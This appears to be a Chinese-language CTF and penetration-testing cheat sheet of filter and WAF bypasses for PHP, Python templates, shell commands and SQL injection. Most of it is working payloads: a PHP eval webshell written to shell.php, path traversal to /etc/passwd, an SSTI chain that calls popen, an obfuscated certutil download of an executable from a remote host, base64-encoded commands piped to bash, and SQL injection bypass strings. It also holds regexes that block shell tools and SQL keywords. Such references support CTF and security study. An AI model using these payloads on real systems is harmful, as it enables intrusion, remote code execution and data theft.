# Web - PHP bypass

- [命令执行 bypass 分享](https://mp.weixin.qq.com/s/L4JVjedgW6lu6GlWt3VXDA)
- [Bypass Linux Shell Restrictions](#linux-shell-bypass)
- 空格绕过 `a=system ('cat /flag');`
- 大小写绕过
- %0a 绕过
- unicode 绕过, `t => \u0074`
- ~ 反码绕过
- [PHP_INCLUDE_TO_SHELL_CHAR_DICT](https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT)
- splstack 绕过匹配 O 开头的序列化数据； [2023 安洵杯 4 号的罗纳尔多](https://mp.weixin.qq.com/s/azbY19cBgs3MgVdo7i-OhQ)
- \_\_halt_compiler();来结束 php 代码执行流程 同上链接
- [bypass | 『红蓝对抗』论 HTTP 分块传输的应用](https://mp.weixin.qq.com/s/QV445IhGIdV5rofFv7qitw)
- [详细|waf 绕过学习](https://mp.weixin.qq.com/s/OeZsKohqe87-ieIuW7L9tA)

[实战绕过某 WAF+拿 shell 组合拳](https://mp.weixin.qq.com/s/Q57dOjq279kqOFtSA1mV8Q)
[webshell 检测算法实践](https://mp.weixin.qq.com/s/M4umpduFCI50zOO-5080cw)

| bypass                                         | payload                                                                                                                 | 解释                                                                         |
| ---------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------- |
|                                                | 大小写绕过                                                                                                              |
|                                                | 双写绕过                                                                                                                |
| <?                                             | `<script language="php">@eval($_POST['1']);</script>`                                                                   | PHP7 后不支持                                                                |
| %2F 代替/                                      | ?filename=..%2F..%2F..%2F..%2Fetc%2Fpasswd                                                                              |                                                                              |
| 二次编码(%25)                                  | ?filename=..%252F..%252F..%252F..%252Fetc%2Fpasswd                                                                      |
| 加入+                                          | ?filename=.+./.+./bin/redacted.dll                                                                                      |
| %00                                            | ?filename=.%00./file.php <br>/etc/passwd%00.jpg                                                                         |
| \                                              | ?filename=..%5c..%5c/windows/win.ini                                                                                    |
| is_numeric                                     | is_numeric ('0xFFFF') 16 进制绕过                                                                                       |
| 反码绕                                         | urlencode(~'system');                                                                                                   |
| replace                                        | 双写绕过                                                                                                                |
| xor bypass                                     | bypass_xorshell.py                                                                                                      |
| php\|strstr                                    | 大小写绕过, strstri 才是大小写不敏感                                                                                    |
| pathinfo                                       | `filename/.`可以绕过 见 php_bypass_pathinfo.py                                                                          |
| `$_POST['e_v.a.l]`                             | `?e[v.a.l=123`                                                                                                          | `空格、+、[`会转为`_`, 存在`[`时后面不会被替换                               |
| `/[oc]:\d+:/i`                                 | 1.[Link](#bypass-ocdi) 利用加号绕过（注意在 url 里传参时+要编码为%2B）<br> 2.利用数组对象绕过，如 serialize(array($a)); |
| `eval(cmd.'givemegirlfriend!')`                | `__halt_compiler();` 来结束 php 代码执行流程，绕过 givemegirlfriend!字符串的影响。                                      |
| ---                                            |
| disable_function                               | 蚁剑插件                                                                                                                |
| --- rce/bash ---                               |                                                                                                                         |
| ---------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------- |
| `ls / \|script xxx`                            | 写文件                                                                                                                  |
| `preg_match("/fi\|le\|flag/i", $_GET['file'])` | `?file=127.0.0.1 \| cat /fla[a-z]gggggg.txt`<br>`?file=f{i}l{e}:///fla{g}gggggg.txt`                                    | `[a-z]`可以绕过任意一个字母 <br> 大括号中只加入一个字符进行绕过，例如：{g}。 |
| `l""s, l''s`                                   | 双引号绕过                                                                                                              |
| `l\s`                                          | \\绕过                                                                                                                  |
| ` l``s `                                       | \`绕过                                                                                                                  |

## bypass functions

## bypass detail

### bypass `filter_var($url, FILTER_VALIDATE_URL)`

`?url=http://`

### bypass `file_get_contents($text,'r')==="welcome to the zjctf"`

`?text=data://test/plain,welcome to the zjctf&file=php://filter/resource=useless.php`
`?text=data://test/plain,I have a dream&file=php://filter/resource=next.php`

### bypass `/[oc]:\d+:/i`

1. `O:+7:"Student":1:{s:1:"a";i:123;}` , +号要编码为%2B

2.

```php
<?php

class Test { public $b; }

function check($data) {
    if (preg_match('/^O:\d+/', $data)) {
        die("died");
    }
}

echo serialize(array(new Test()));
```

# Web - Python bypass

```py
{{ config.__class__.__init__.__globals__['\x6f\x73'].__getattribute__('\x70\x6f\x70\x65\x6e')('ls /').read() }}
{{ config.__class__.__init__.__globals__['\x6f\x73'].__getattribute__('\x70\x6f\x70\x65\x6e')('cat /this_is_the_fla""g.txt').read() }}
```

# Cmd bypass

```sh
c""""e""""r""""t""""u""""t""""i""""l.exe -urlcache -split -f http://ip/6666.exe 6666.exe

copy /b 1.jpg+2.jpg 3 /y

```

# Linux/Windows shell bypass

[Bypass Linux Shell Restrictions](https://mp.weixin.qq.com/s/8QTax87lorWNnOQR8p1ORQ)

## Test Regex

```bash
# Linux
/dir/ls|bash|tac|nl|more|less|head|base64|wget|curl|tail|vi|cat|tee|od|grep|sed|bzmore|bzless|pcre|paste|python|diff|file|echo|touch|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i
# Windows
/type/
```

| windows 管道符   | Description                  | 示例                   |
| ---------------- | ---------------------------- | ---------------------- |
| \|               | 直接执⾏后⾯的语句。         | ping 127.0.0.1\|whoami |
| \|\|             | 前面为假时执⾏               | ping 2 \|\| whoami     |
| &                | 前⾯可真可假                 | ping 127.0.0.1&whoami  |
| &&               | 前⾯只能为真                 | ping 127.0.0.1&&whoami |
| **Linux 管道符** |                              |                        |
| ;                | 执⾏完前⾯的语句再执⾏后⾯的 | ping 127.0.0.1;whoami  |
| \|               | 显示后⾯语句的执⾏结果       | ping 127.0.0.1\|whoami |
| \|\|             | 前面为假时执⾏               | ping 1\|\|whoami       |
| &                | 前⾯可真可假                 | ping 127.0.0.1&whoami  |
| &&               | 前⾯只能为真                 | ping 127.0.0.1&&whoami |

/bin/bash 支持(新版 kali 需要切换为 bash)

| symbol   | bypass       | url 中 | 示例                                                                                    |
| -------- | ------------ | ------ | --------------------------------------------------------------------------------------- |
| >        | ${PS2}       |        |
| +        | ${PS4}       |        |
| tab      | ${9}         | %09    |
| 空格     | ${IFS}       |        | cat${IFS}/flag <br> cat${IFS}$9/flag<br> cat$IFS$9/flag                                 |
|          | +            |        |                                                                                         |
|          | {}           |        | {ls,-l}                                                                                 |
|          | < <>         |        | cat</flag cat<>/flag                                                                    |
|          | url:%20, %09 |        | cat%09/flag <br>X=$'cat\x09./flag.php';$X                                               |
| 任意字符 | ${SHELLOPTS} |        | `${SHELLOPTS:1:1}  -- r`<br>`${SHELLOPTS:3:1}  -- c`<br>`${SHELLOPTS:3:1}at -- cat`<br> |
|          | \            |        | c\a\t /flag                                                                             |
|          | \* ?         |        | cat f\* 　　　 cat /???/???sw? <br> ?代表⼀个字符<br> []代表范围内任意一个字符<br>      |
|          | base64       |        | `echo "aWQ="\|base64 -d` -- id <br>`echo "aWQ="\|base64 -d\|bash`                       |
|          | ''           |        | c''at /flag                                                                             |
|          | ""           |        | c""at /flag                                                                             |
|          | 特殊变量@t   |        | ca$@t /flag                                                                             |
|          | 拼接         |        | a=c;b=at;c=flag;$a$b $c                                                                 |

`${IFS}` 对应 内部字段分隔符

```sh
127.0.0.1 &echo "<?php @eval(\$_POST['a']);?>" >> shell.php

过滤"ping -c 4 {$_GET['ip']}"
    =>|ls, |cat flag.php, 看源码,
    注意: 使用| 这不是连续执行, 只能一级传一级,要连续就用127.0.0.1;ls
```

```bash
绕过技巧:  base64-- echo "bHMgLWxoYSAv"|base64 -d|bash > test.png
写入文件: dir |tee 1.txt
新建文件: touch 1.txt
```

# Sql bypass

- https://github.com/Xyntax/waf-bypass/blob/master/payload/sql.txt
- https://lexsd6.github.io/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/#%E6%96%B9%E6%B3%95%E6%9B%BF%E6%8D%A2%E7%BB%95%E8%BF%87
- [sql 注入 bypass waf 工具（1 月 18 日更新）](https://mp.weixin.qq.com/s/qritLmRwP-Q5OLskxNWSVw)
- [Sql 注入过安全狗](https://mp.weixin.qq.com/s/Ighou2aYORZ7rGvJfpeeHg)

解题提示：

- 猜 列为 flag, 表为 flag , select flag from flag

| bypass     | string                                           |                                                                                                                                            |
| ---------- | ------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------ |
| 大小写     |                                                  |                                                                                                                                            |
| 双写       |                                                  |                                                                                                                                            |
| =          | like/rlike/regexp                                | 或用 !<> , rlike 支持正则                                                                                                                  |
| 空格       | /\*\*/ 或 + 或 ()                                | php 可用 %09、%0A、 %0B、 %0C、 %0D、%A0、%20 <br>and/or 后面可以跟上偶数个!、~可以替代空格 <br>and/or 前的空格可用省略. <br>'后空格可省略 |
| and        | &&                                               |
| or         | \|\|                                             |
| select     | [handler](#handler)/updatexml/extractvalue       |                                                                                                                                            |
| 16 进制    | hex 自动转字符                                   | 0x61 即 a                                                                                                                                  |
| 1000       | 0x38e<br>`992\|8`<br>--1000<br>~~1000<br>200^800 |
| substr     | mid,left,right                                   |
| ,逗号      | `from . for . `                                  | `select substr(database() from 1 for 1);`, mid 相同 <br> limit 0,1 => limit 1 offset 0                                                     |
| **Mysql8** |                                                  |
| select     | [table](#sqltable)                               | table myuser == select \* from myuser                                                                                                      |

`reverse` 可配合报错注入截取

## Test Regex

见 sql_fuzz.json

```bash
/**/,sElect,uNion,(),	,oR,aNd,taBLE,bEtween,like,regexp, ,",',^,+,Hex,0b1111101000,?,sHow,dEsc,orDer By,--,~~,`,CONcat,aLter,Columns,*,UpdateXml,ExtractValue,load_file,//,sUbstr,mId,=,mId,lIke,iNto,fIle,iF,sLeep,bEnchmark,lEft,rIght,^,&,||,>,<,#,-,aScii,oRd,sT_,fLoor,gEomfromtext,x(,pOw,cAse,rPad,rEpeat,jOin,bUffer,iNcrement,iNfo,sYs,lImit,oRder,bY,iNsert,uPdate,dElete,iNform
dAtabases,tAbles,uSer,0x,cHar
mysql.innodb_index_stats,mysql.innodb_table_stats,sys.schema_auto_increment_columns
DESC `table name`
SHOW COLUMNS FROM `table name`
```

```sh
-- 绕过  select b from (select 1,2,3 as b union select * from admin)a;
只能是数字: '0' + 使用2次hex + '0'        -- 网鼎杯 2018 unfinish/ctfshow内部赛签到
password在字段名  有password，passwd，pwd -- 见writeup MySQL查询的按位比较
看: 常见的SQL注入考点 CTF-123458
mysql8 (https://mp.weixin.qq.com/s/U65QGzQoR1EY0QFaTy5--g) , table命令
```

## sql/handler

```sql
handler auth_permission open as yunensec;
handler yunensec read first;
handler yunensec read next;
handler yunensec close;
```

## sql/table

[for mysql8](https://mp.weixin.qq.com/s/U65QGzQoR1EY0QFaTy5--g) -- Web*sql*一篇文章弄懂 mysql8 新特性注入.html

1.TABLE 始终显示表的所有列 2.TABLE 不允许对行进行任意过滤，即 TABLE 不支持任何 WHERE 子句

```sh
(TABLE information_schema.tables ORDER BY TABLE_SCHEMA LIMIT 1 OFFSET 0)>(1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)
table user order by 2
table user limit 2
table user limit 0,1
```
